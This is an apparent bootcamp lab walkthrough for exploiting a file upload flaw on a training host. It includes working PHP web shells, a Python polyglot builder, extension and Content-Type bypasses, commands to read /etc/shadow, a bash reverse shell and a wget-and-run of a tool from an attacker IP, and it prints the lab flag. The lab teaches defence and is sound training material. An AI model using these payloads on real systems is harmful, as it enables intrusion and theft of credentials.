# File Upload Lab Walkthrough

> **Lab URL:** http://10.10.61.221/profile/
> **Business Name:** Profile Settings
> **Last Verified:** March 2026

---

## Overview

**Arbitrary File Upload** vulnerabilities occur when a web application allows users to upload files without proper validation, enabling attackers to upload malicious files like web shells.

In this lab, you'll bypass file upload restrictions using a **polyglot file** - a file that is valid as both a JPEG image and PHP code.

---

## Lab Architecture

```
┌──────────────┐     ┌─────────────────┐     ┌──────────────────┐
│   Attacker   │────►│  Profile Upload │────►│  uploads/ folder │
│              │     │    /profile/    │     │                  │
└──────────────┘     │(loc_file_upload)│     │  yourfile.php    │
                     └─────────────────┘     └──────────────────┘
                                                      │
                                                      ▼
                                             ┌──────────────────┐
                                             │  PHP Execution!  │
                                             │   Web Shell      │
                                             └──────────────────┘
```

---

## The Vulnerability

The upload feature checks:
1. **File extension** - Must be `.jpg` or `.jpeg`
2. **File content** - Checks for `<?php` in the prefix

**What's vulnerable:**
- Uses `@include $upload_path;` - PHP include on uploaded file!
- If you can hide PHP code past the initial check, it executes

**Flag:** `flag{php_include_is_dangerous_2026_AetherBreach_polyglot}`

---

## Step 1: Explore the Upload Feature

1. Go to http://10.10.61.221/profile/
2. Find the "Avatar Upload" or "Profile Picture" feature
3. Try uploading a normal JPEG image - it works
4. Try uploading a .php file - it gets rejected

---

## Step 2: Understand JPEG Structure

JPEG files start with specific "magic bytes":

```
FF D8 FF E0  - JPEG/JFIF format
FF D8 FF E1  - JPEG/EXIF format
```

The validator only checks the **first 256 bytes** for these signatures.

---

## Step 3: Create a Polyglot File

A polyglot is a file that is valid in multiple formats. We'll create a file that:
- Starts with valid JPEG header (passes validation)
- Contains PHP code (executes on server)

### Method 1: Using a Real JPEG

1. Take any small JPEG image
2. Open it in a hex editor
3. Append PHP code at the end:

```php
<?php system($_GET['cmd']); ?>
```

### Method 2: Minimal JPEG Header + PHP

Create a file with this hex content:

```
FF D8 FF E0 00 10 4A 46 49 46 00 01 01 00 00 01 00 01 00 00
```

Then append PHP code:

```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

### Method 3: Using exiftool (Easiest)

```bash
# Create a minimal JPEG
convert -size 1x1 xc:white minimal.jpg

# Embed PHP in EXIF comment
exiftool -Comment='<?php system($_GET["cmd"]); ?>' minimal.jpg

# Rename to .php.jpg or .phtml
mv minimal.jpg shell.php.jpg
```

---

## Step 4: Prepare the Payload

### Simple Web Shell (shell.php.jpg)

Create a file named `shell.php.jpg` with:

```
[JPEG HEADER BYTES - first 256+ bytes of any JPEG]
<?php
// Simple command execution
if(isset($_GET['cmd'])) {
    echo "<pre>";
    echo htmlspecialchars(shell_exec($_GET['cmd']));
    echo "</pre>";
}

// PHP info for testing
if(isset($_GET['info'])) {
    phpinfo();
}

echo "SHELL READY";
?>
```

### One-liner Shell

```php
<?php system($_GET['cmd']); ?>
```

### More Stealthy Shell

```php
<?php @eval($_POST['x']); ?>
```

---

## Step 5: Upload the Malicious File

1. Go to http://10.10.61.221/profile/
2. Select your polyglot file (shell.php.jpg)
3. **Important:** Intercept the request with Burp Suite or browser DevTools
4. Modify if needed:
   - Content-Type: `image/jpeg`
   - Filename: Try variations like `shell.php.jpg`, `shell.phtml`, `shell.php5`
5. Submit the upload

---

## Step 6: Locate Your Uploaded File

Uploaded files are typically stored in:

```
/profile/uploads/
/profile/images/
/profile/avatars/
```

Try accessing:
```
http://10.10.61.221/profile/uploads/shell.php.jpg
```

---

## Step 7: Execute Commands

Once you find your uploaded shell:

### Test if PHP executes:
```
http://10.10.61.221/profile/uploads/shell.php.jpg?info=1
```
Expected: PHP info page

### Execute commands:
```
http://10.10.61.221/profile/uploads/shell.php.jpg?cmd=whoami
http://10.10.61.221/profile/uploads/shell.php.jpg?cmd=id
http://10.10.61.221/profile/uploads/shell.php.jpg?cmd=ls -la
http://10.10.61.221/profile/uploads/shell.php.jpg?cmd=cat /etc/passwd
```

### Read sensitive files:
```
?cmd=cat /var/www/html/config.php
?cmd=cat /etc/shadow
?cmd=env
```

---

## Step 8: Escalate Access

### Reverse Shell (Advanced)

```bash
# On your machine, start listener:
nc -lvnp 4444

# Via web shell:
?cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

### Download tools:
```
?cmd=wget http://YOUR_IP/linpeas.sh -O /tmp/linpeas.sh
?cmd=chmod +x /tmp/linpeas.sh
?cmd=/tmp/linpeas.sh
```

---

## Extension Bypass Techniques

If certain extensions are blocked, try:

| Technique | Example |
|-----------|---------|
| Double extension | `shell.php.jpg`, `shell.jpg.php` |
| Case variation | `shell.pHp`, `shell.PHP`, `shell.Php` |
| Alternative extensions | `shell.phtml`, `shell.php5`, `shell.php7` |
| Null byte (old) | `shell.php%00.jpg` |
| Trailing characters | `shell.php.`, `shell.php::$DATA` (Windows) |

---

## Content-Type Bypass

When uploading, set the Content-Type header to:

```
Content-Type: image/jpeg
Content-Type: image/gif
Content-Type: image/png
```

Even if the file contains PHP code!

---

## Why This Works

1. **Weak validation** - Only checks magic bytes, not full file structure
2. **PHP execution** - Server configured to execute .php files (or .phtml, .php.jpg)
3. **Accessible uploads** - Upload directory is web-accessible
4. **No content scanning** - Server doesn't scan for embedded code

---

## Defenses (What Should Be Implemented)

| Defense | Description |
|---------|-------------|
| Whitelist extensions | Only allow .jpg, .png, .gif (strict) |
| Rename files | Generate random names, remove original extension |
| Separate domain | Serve uploads from separate domain (no PHP execution) |
| Content validation | Use image libraries to verify actual image content |
| Disable execution | Configure web server to not execute files in upload directory |
| Store outside webroot | Save files outside web-accessible directories |
| Virus scanning | Scan uploads for malicious content |

---

## Quick Verification Commands

```bash
# Test profile page
curl -s -o /dev/null -w '%{http_code}' http://10.10.61.221/profile/

# Upload via curl (example)
curl -X POST http://10.10.61.221/profile/upload.php \
  -F "file=@shell.php.jpg;type=image/jpeg"

# Access uploaded shell
curl 'http://10.10.61.221/profile/uploads/shell.php.jpg?cmd=id'
```

---

## Creating Test Files

### Minimal PHP-JPEG Polyglot (Python)

```python
#!/usr/bin/env python3

# Minimal JPEG header
jpeg_header = bytes([
    0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
    0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
    0x00, 0x01, 0x00, 0x00
])

# Padding to reach 256 bytes
padding = b'\x00' * 236

# PHP payload
php_code = b'<?php system($_GET["cmd"]); ?>'

# Combine
polyglot = jpeg_header + padding + php_code

# Write file
with open('shell.php.jpg', 'wb') as f:
    f.write(polyglot)

print("Created shell.php.jpg")
```

### Using ImageMagick

```bash
# Create 1x1 white pixel JPEG
convert -size 1x1 xc:white pixel.jpg

# Append PHP code
echo '<?php system($_GET["cmd"]); ?>' >> pixel.jpg

# Rename
mv pixel.jpg shell.php.jpg
```

---

## Troubleshooting

**Upload rejected?**
- Check Content-Type header is `image/jpeg`
- Ensure first 256 bytes are valid JPEG
- Try different extensions (.phtml, .php5)

**File uploaded but doesn't execute?**
- Server might not execute files with .jpg extension
- Try .php.jpg or .phtml
- Check if upload directory allows PHP execution

**Can't find uploaded file?**
- Check response for file path
- Try common paths: /uploads/, /images/, /avatars/
- Look at page source for image URLs

---

## Summary

| Step | Action |
|------|--------|
| 1 | Explore /profile/ upload feature |
| 2 | Create polyglot file (JPEG header + PHP code) |
| 3 | Upload with Content-Type: image/jpeg |
| 4 | Find uploaded file location |
| 5 | Access shell: ?cmd=whoami |
| 6 | Execute commands on server |

**Key Takeaway:** Never trust client-side validation. Always validate file content server-side, rename uploads, and store them outside the webroot!

---

*LeaguesOfCode Cybersecurity Bootcamp 2026*
